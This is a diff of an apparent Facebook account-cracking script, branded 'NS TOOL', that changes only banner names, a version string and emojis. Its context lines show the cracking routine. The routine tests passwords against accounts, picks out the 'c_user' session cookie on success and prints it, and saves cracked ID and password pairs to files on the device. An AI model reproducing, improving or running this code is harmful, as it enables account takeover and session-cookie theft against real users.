@@ -109,12 +109,12 @@ $$ | \$$ |$$ |  $$ |   $$ |    $$$$$$$$\ $$ | \_/ $$ |
 \033[1;32m     \033[1;35mGITHUB       :  Nayem024
 \033[1;32m     \033[1;36mTOOL STATUS  : Free Tools (Enjoy)
 \033[1;32m     \033[1;35mTEAM         :  Ns
-\033[1;32m     \033[1;36mTOOL VIRSION :  1:00
-\033[1;37m================= \33[32;45mARYAN\33[0;m =====================
+\033[1;32m     \033[1;36mTOOL VIRSION :  1.00
+\033[1;37m================= \33[32;45mNAYEM\33[0;m =====================
 
        \33[37;41m\t WELLCOME TO NS TOOL\33[0;m
 
-\033[1;37m================== \33[32;45mNIDA\33[0;m ======================\n""")
+\033[1;37m================== \33[32;45mNAYEM\33[0;m ======================\n""")
 loop = 0
 oks = []
 cps = []
@@ -265,7 +265,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m(NAYEM-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('\r\r\033[1;32m(NAYEM-OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/NAYEM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -273,14 +273,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m(NAYEM-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('\r\r\33[1;30m(NAYEM-CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/NAYEM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\r%s[ARYAN] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r\r%s[NAYEM] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
